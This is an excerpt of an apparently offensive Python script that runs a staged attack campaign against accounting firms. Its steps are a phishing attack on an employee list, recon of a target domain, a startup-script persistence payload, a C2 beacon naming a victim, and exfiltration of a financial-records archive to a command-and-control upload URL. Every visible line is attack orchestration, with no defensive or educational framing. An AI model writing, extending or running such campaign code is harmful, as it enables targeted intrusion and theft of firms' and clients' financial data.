...
def main():
    """
    Main function to run the accounting_firm_campaign campaign.
    """
    print(f"[*] Starting accounting_firm_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("accounting_firms_employees.txt")
    run_tool("apt_web_recon.js", "--target accounting_firms.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/financial_records_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-ACCOUNTING_FIRMS-01")
    ...
    exfiltration.exfiltrate_data("financial_records/financial_records.zip", "https://c2.example.com/upload")
    run_tool("payloads/financial_records_exfiltrator.py")
